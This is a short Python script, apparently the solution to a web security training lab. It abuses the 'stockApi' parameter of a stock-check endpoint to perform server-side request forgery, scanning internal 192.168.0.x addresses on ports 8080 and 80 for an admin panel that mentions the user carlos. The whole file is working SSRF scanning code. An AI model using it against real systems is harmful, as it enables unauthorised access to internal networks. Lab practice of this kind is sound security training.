import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.info("Scanning 192.168.0.0/24 for admin panel on port 8080...")

for i in range(1, 256):
    ip = f"192.168.0.{i}"
    resp = lab.post("/product/stock", data={
        "stockApi": f"http://{ip}:8080/admin"
    })
    if resp.status_code == 200:
        lab.success(f"Admin panel at {ip}:8080 (status {resp.status_code})")
        if "carlos" in resp.text:
            lab.success(f"Found carlos! Target: {ip}")
        break
    if i % 50 == 0:
        lab.info(f"Scanned {i}/255...")
else:
    lab.info("Nothing on 8080, trying port 80...")
    for i in range(1, 256):
        ip = f"192.168.0.{i}"
        resp = lab.post("/product/stock", data={
            "stockApi": f"http://{ip}/admin"
        })
        if resp.status_code == 200:
            lab.success(f"Admin panel at {ip}:80 (status {resp.status_code})")
            if "carlos" in resp.text:
                lab.success(f"Found carlos! Target: {ip}")
            break
        if i % 50 == 0:
            lab.info(f"Scanned {i}/255...")

lab.info("Scan complete")
